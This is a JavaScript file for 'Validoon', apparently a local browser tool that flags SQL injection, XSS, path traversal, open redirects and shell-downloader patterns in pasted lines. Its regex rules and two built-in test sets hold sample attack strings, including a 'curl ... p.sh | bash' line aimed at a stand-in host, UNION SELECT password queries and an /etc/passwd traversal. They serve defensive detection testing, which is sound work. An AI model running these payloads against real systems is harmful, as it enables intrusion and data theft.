// app.js
(() => {
  "use strict";

  const $ = (id) => document.getElementById(id);

  const els = {
    year: $("year"),

    txtInput: $("txtInput"),
    btnRun: $("btnRun"),
    btnExport: $("btnExport"),
    btnTestA: $("btnTestA"),
    btnTestB: $("btnTestB"),
    btnClear: $("btnClear"),

    lblVerdict: $("lblVerdict"),
    lblPeakSeverity: $("lblPeakSeverity"),
    lblConfidence: $("lblConfidence"),

    lblScans: $("lblScans"),
    lblAllow: $("lblAllow"),
    lblWarn: $("lblWarn"),
    lblBlock: $("lblBlock"),

    chipsSignals: $("chipsSignals"),
    listReasons: $("listReasons"),
    listRemediation: $("listRemediation"),

    tblBody: $("tblBody"),

    btnDocs: $("btnDocs"),
    btnAbout: $("btnAbout"),
    modalBackdrop: $("modalBackdrop"),
    modalTitle: $("modalTitle"),
    modalBody: $("modalBody"),
    btnCloseModal: $("btnCloseModal"),
  };

  // Hard-fail guard (prevents "missing element #btnRun" errors)
  const requiredIds = [
    "txtInput","btnRun","btnExport","btnTestA","btnTestB","btnClear",
    "lblVerdict","lblPeakSeverity","lblConfidence",
    "lblScans","lblAllow","lblWarn","lblBlock",
    "chipsSignals","listReasons","listRemediation","tblBody",
    "modalBackdrop","modalTitle","modalBody","btnCloseModal"
  ];
  for (const id of requiredIds) {
    if (!$(id)) {
      // Visible error in console, but do not crash the page
      console.error("Validoon: missing element #" + id);
      return;
    }
  }

  els.year.textContent = String(new Date().getFullYear());

  // ---------------------------
  // Heuristic scanner (local-only)
  // ---------------------------
  const RULES = [
    { key:"INSECURE_HTTP", type:"URL", weight:18, conf:0.70, test:s => /^http:\/\//i.test(s), reason:"URL uses HTTP (unencrypted).", fix:"Prefer HTTPS; block http links in pipelines." },
    { key:"REDIRECT_PARAM", type:"URL", weight:22, conf:0.78, test:s => /\b(redirect|return|next|url)=https?:\/\//i.test(s), reason:"Potential open-redirect parameter present.", fix:"Allowlist redirect targets; validate return URLs server-side." },
    { key:"AUTH_ENDPOINT", type:"URL", weight:16, conf:0.68, test:s => /(login|signin|oauth|authorize|token|callback)/i.test(s) && /https?:\/\//i.test(s), reason:"Authentication-related endpoint detected.", fix:"Verify domain and path; apply strict input validation." },

    { key:"SQLI_TAUTOLOGY", type:"Exploit", weight:30, conf:0.90, test:s => /\b(or)\s+1\s*=\s*1\b/i.test(s) || /'\s*or\s*'1'\s*=\s*'1/i.test(s), reason:"OR 1=1 tautology detected (SQLi).", fix:"Use parameterized queries; add WAF rules for tautologies." },
    { key:"SQLI_UNION_ALL", type:"Exploit", weight:34, conf:0.92, test:s => /\bunion\s+all\s+select\b/i.test(s), reason:"UNION ALL SELECT indicates SQL injection attempt.", fix:"Use prepared statements; sanitize/validate inputs; add SQLi detection." },

    { key:"XSS_SCRIPT", type:"Exploit", weight:28, conf:0.90, test:s => /<\s*script\b/i.test(s) || /\bon\w+\s*=\s*["']?/i.test(s), reason:"<script> tag or inline event handler found (XSS payload).", fix:"Escape output; enforce CSP (server headers); strip dangerous HTML." },

    { key:"LF_ETC_PASSWD", type:"Exploit", weight:26, conf:0.90, test:s => /\/etc\/passwd/i.test(s), reason:"/etc/passwd reference indicates LFI attempt.", fix:"Block path traversal; enforce allowlist paths; normalize and validate." },
    { key:"LF_PATH_TRAVERSAL", type:"Exploit", weight:24, conf:0.85, test:s => /(\.\.\/){2,}/.test(s) || /(\.\.\\){2,}/.test(s), reason:"Directory traversal pattern detected.", fix:"Normalize path; reject '..' segments; use allowlist routing." },

    { key:"BASE64_DECODE", type:"Data", weight:10, conf:0.55, test:s => /(^|[^A-Za-z0-9+/=])[A-Za-z0-9+/]{60,}={0,2}([^A-Za-z0-9+/=]|$)/.test(s), reason:"High-likelihood base64 blob detected.", fix:"If unexpected, treat as suspicious; decode safely and inspect." },

    { key:"HOMOGRAPH_RISK", type:"URL", weight:14, conf:0.65, test:s => /https?:\/\/[^\s/]*[^\x00-\x7F]/.test(s) || /xn--/i.test(s), reason:"Non-ASCII / punycode host indicates possible homograph risk.", fix:"Verify domain carefully; show punycode; enforce allowlist." },

    { key:"CMD_CHAIN", type:"Exploit", weight:20, conf:0.78, test:s => /(\|\||&&|;)\s*(curl|wget|bash|sh|powershell|cmd|python)\b/i.test(s), reason:"Command chaining / downloader pattern detected.", fix:"Block shell metacharacters; isolate execution; validate inputs." },
  ];

  function entropy(str) {
    const s = String(str || "");
    if (!s.length) return 0;
    const freq = new Map();
    for (const ch of s) freq.set(ch, (freq.get(ch) || 0) + 1);
    let ent = 0;
    for (const [, count] of freq) {
      const p = count / s.length;
      ent -= p * Math.log2(p);
    }
    return ent;
  }

  function decisionFromScore(score) {
    if (score >= 60) return "BLOCK";
    if (score >= 20) return "WARN";
    return "ALLOW";
  }

  function clamp(n, a, b){ return Math.max(a, Math.min(b, n)); }

  function analyzeLine(line) {
    const raw = line.trim();
    if (!raw) return null;

    const hits = [];
    let score = 0;
    let confSum = 0;
    let confW = 0;

    for (const r of RULES) {
      if (r.test(raw)) {
        hits.push(r);
        score += r.weight;
        confSum += r.conf * r.weight;
        confW += r.weight;
      }
    }

    const ent = entropy(raw);
    // Obfuscation hint via entropy
    if (ent >= 4.6 && raw.length >= 18) {
      hits.push({
        key:"OBFUSCATION_HINT", type:"Data", weight:10, conf:0.58,
        reason:"High entropy string may indicate obfuscation.",
        fix:"If unexpected, decode/inspect safely; treat as suspicious."
      });
      score += 10;
      confSum += 0.58 * 10;
      confW += 10;
    }

    const decision = decisionFromScore(score);
    const severity = clamp(Math.round(score), 0, 100);
    const confidence = confW ? clamp(Math.round((confSum / confW) * 100), 0, 100) : 52;

    // type: choose strongest hit type
    let type = "Data";
    if (/https?:\/\//i.test(raw)) type = "URL";
    if (hits.some(h => h.type === "Exploit")) type = "Exploit";

    const reasons = hits.map(h => h.reason);
    const remediation = hits.map(h => h.fix);

    // signals are unique keys
    const signals = Array.from(new Set(hits.map(h => h.key)));

    return {
      segment: raw,
      type,
      decision,
      severity,
      confidence,
      entropy: Number(ent.toFixed(2)),
      signals,
      reasons,
      remediation
    };
  }

  function summarize(results) {
    let allow = 0, warn = 0, block = 0;
    let peakSeverity = 0;
    let peakConf = 0;
    const signalSet = new Set();
    const reasons = [];
    const remediation = [];

    for (const r of results) {
      if (r.decision === "ALLOW") allow++;
      else if (r.decision === "WARN") warn++;
      else block++;

      peakSeverity = Math.max(peakSeverity, r.severity);
      peakConf = Math.max(peakConf, r.confidence);

      for (const s of r.signals) signalSet.add(s);
    }

    // Pick top reasons/remediation from the worst item
    const worst = results.slice().sort((a,b) => b.severity - a.severity)[0];
    if (worst) {
      for (const x of worst.reasons) if (x && !reasons.includes(x)) reasons.push(x);
      for (const x of worst.remediation) if (x && !remediation.includes(x)) remediation.push(x);
    }

    const systemVerdict = block ? "DANGER" : (warn ? "SUSPICIOUS" : "SECURE");
    return {
      scans: results.length,
      allow, warn, block,
      peakSeverity,
      confidence: peakConf || 52,
      signals: Array.from(signalSet),
      systemVerdict,
      reasons,
      remediation
    };
  }

  function setVerdictUI(summary) {
    const v = summary.systemVerdict;

    els.lblVerdict.textContent = v;
    els.lblVerdict.classList.remove("ok","warn","bad");
    if (v === "SECURE") els.lblVerdict.classList.add("ok");
    else if (v === "SUSPICIOUS") els.lblVerdict.classList.add("warn");
    else els.lblVerdict.classList.add("bad");

    els.lblPeakSeverity.textContent = summary.peakSeverity + "%";
    els.lblConfidence.textContent = summary.confidence + "%";

    els.lblScans.textContent = String(summary.scans);
    els.lblAllow.textContent = String(summary.allow);
    els.lblWarn.textContent = String(summary.warn);
    els.lblBlock.textContent = String(summary.block);

    // Chips
    els.chipsSignals.innerHTML = "";
    if (!summary.signals.length) {
      const span = document.createElement("span");
      span.className = "chip muted";
      span.textContent = "No signals";
      els.chipsSignals.appendChild(span);
    } else {
      for (const s of summary.signals) {
        const span = document.createElement("span");
        span.className = "chip";
        if (/SQLI|XSS|LF_|CMD|UNION|TAUTOLOGY/.test(s)) span.classList.add("bad");
        else if (/INSECURE|REDIRECT|HOMOGRAPH|OBFUSCATION/.test(s)) span.classList.add("warn");
        else span.classList.add("ok");
        span.textContent = s;
        els.chipsSignals.appendChild(span);
      }
    }

    // Lists
    els.listReasons.innerHTML = "";
    (summary.reasons.length ? summary.reasons : ["No immediate threat detected. Routine monitoring only."]).forEach(t => {
      const li = document.createElement("li");
      li.textContent = t;
      els.listReasons.appendChild(li);
    });

    els.listRemediation.innerHTML = "";
    (summary.remediation.length ? summary.remediation : [
      "Proceed with caution; verify context and source.",
      "If URL: open in isolated environment and verify domain carefully.",
      "Inspect logs for related activity and source."
    ]).forEach(t => {
      const li = document.createElement("li");
      li.textContent = t;
      els.listRemediation.appendChild(li);
    });
  }

  function badge(decision) {
    const span = document.createElement("span");
    span.className = "badge";
    if (decision === "ALLOW") span.classList.add("ok");
    if (decision === "WARN") span.classList.add("warn");
    if (decision === "BLOCK") span.classList.add("bad");
    span.textContent = decision;
    return span;
  }

  function renderTable(results) {
    els.tblBody.innerHTML = "";
    if (!results.length) {
      const tr = document.createElement("tr");
      const td = document.createElement("td");
      td.colSpan = 7;
      td.className = "muted";
      td.textContent = "No results yet.";
      tr.appendChild(td);
      els.tblBody.appendChild(tr);
      return;
    }

    results.forEach((r, idx) => {
      const tr = document.createElement("tr");

      const tdLine = document.createElement("td");
      tdLine.textContent = String(idx + 1);
      tr.appendChild(tdLine);

      const tdSeg = document.createElement("td");
      tdSeg.textContent = r.segment;
      tr.appendChild(tdSeg);

      const tdType = document.createElement("td");
      tdType.textContent = r.type;
      tdType.className = "muted";
      tr.appendChild(tdType);

      const tdDecision = document.createElement("td");
      tdDecision.appendChild(badge(r.decision));
      tr.appendChild(tdDecision);

      const tdSev = document.createElement("td");
      tdSev.textContent = r.severity + "%";
      tr.appendChild(tdSev);

      const tdConf = document.createElement("td");
      tdConf.textContent = r.confidence + "%";
      tr.appendChild(tdConf);

      const tdEnt = document.createElement("td");
      tdEnt.textContent = String(r.entropy);
      tdEnt.className = "muted";
      tr.appendChild(tdEnt);

      els.tblBody.appendChild(tr);
    });
  }

  function getLines() {
    return els.txtInput.value
      .split(/\r?\n/)
      .map(s => s.trim())
      .filter(Boolean);
  }

  function runScan() {
    const lines = getLines();
    const results = [];
    for (const line of lines) {
      const r = analyzeLine(line);
      if (r) results.push(r);
    }

    const sum = summarize(results);
    setVerdictUI(sum);
    renderTable(results);

    // store last report for export
    window.__VALIDOON_LAST__ = {
      generatedAt: new Date().toISOString(),
      system: sum,
      results
    };
  }

  function exportJSON() {
    const data = window.__VALIDOON_LAST__ || {
      generatedAt: new Date().toISOString(),
      system: summarize([]),
      results: []
    };
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "validoon_report.json";
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }

  function clearAll() {
    els.txtInput.value = "";
    window.__VALIDOON_LAST__ = null;

    setVerdictUI({
      scans: 0, allow: 0, warn: 0, block: 0,
      peakSeverity: 0, confidence: 0,
      signals: [],
      systemVerdict: "—",
      reasons: [],
      remediation: []
    });
    renderTable([]);
  }

  function loadTestA() {
    els.txtInput.value = [
      "https://example.com/",
      "https://accounts.google.com/signin/v2/identifier",
      "http://example.com/login?redirect=https://evil.invalid",
      "SELECT * FROM users WHERE id='1' OR 1=1;",
      "UNION ALL SELECT username,password FROM users;",
      "<script>alert(1)</script>",
      "../../etc/passwd",
      "Normal entry: user_id=42 action=view_report"
    ].join("\n");
    runScan();
  }

  function loadTestB() {
    els.txtInput.value = [
      "INFO 2026-01-03 request_id=abc123 path=/api/login status=200",
      "GET http://insecure.example.com/callback?next=https://evil.invalid",
      "POST /search q=' OR '1'='1",
      "payload=QmFzZTY0RW5jb2RlZFN0cmluZ0xvbmdMb25nTG9uZ0xvbmc=",
      "cmd=echo test && curl http://bad.example.com/p.sh | bash",
      "https://xn--pple-43d.com/login"
    ].join("\n");
    runScan();
  }

  // Modal helpers
  function openModal(title, html) {
    els.modalTitle.textContent = title;
    els.modalBody.innerHTML = html;
    els.modalBackdrop.hidden = false;
  }
  function closeModal() {
    els.modalBackdrop.hidden = true;
  }

  // Wire events
  els.btnRun.addEventListener("click", runScan);
  els.btnExport.addEventListener("click", exportJSON);
  els.btnClear.addEventListener("click", clearAll);
  els.btnTestA.addEventListener("click", loadTestA);
  els.btnTestB.addEventListener("click", loadTestB);

  els.btnCloseModal.addEventListener("click", closeModal);
  els.modalBackdrop.addEventListener("click", (e) => {
    if (e.target === els.modalBackdrop) closeModal();
  });

  els.btnDocs.addEventListener("click", (e) => {
    e.preventDefault();
    openModal("Tips", `
      <ul>
        <li>Paste one item per line (URLs, log lines, payloads).</li>
        <li>Use <b>Test A</b> and <b>Test B</b> to verify buttons + rendering.</li>
        <li>This demo is <b>local-only</b>: no network calls.</li>
      </ul>
    `);
  });

  els.btnAbout.addEventListener("click", (e) => {
    e.preventDefault();
    openModal("About", `
      <p><b>Validoon</b> is a local triage UI. It applies heuristic rules to label inputs as ALLOW/WARN/BLOCK and produces an exportable JSON report.</p>
      <p>No uploads. No external scripts.</p>
    `);
  });

  // Initial clean state
  clearAll();
})();
